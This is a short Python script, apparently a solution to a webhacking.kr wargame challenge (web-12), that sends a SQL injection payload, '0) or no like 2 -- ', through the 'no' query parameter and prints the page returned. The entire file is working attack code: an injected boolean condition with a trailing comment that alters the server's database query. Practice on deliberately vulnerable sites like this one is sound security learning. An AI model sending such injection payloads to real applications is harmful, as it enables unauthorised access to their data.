import requests

url='http://webhacking.kr/challenge/web/web-12/index.php'

cookies = {
	'PHPSESSID': ''
}

payloads = {
	'no': '0) or no like 2 -- '
}

res = requests.get(url, cookies=cookies, params=payloads)
print(res.text)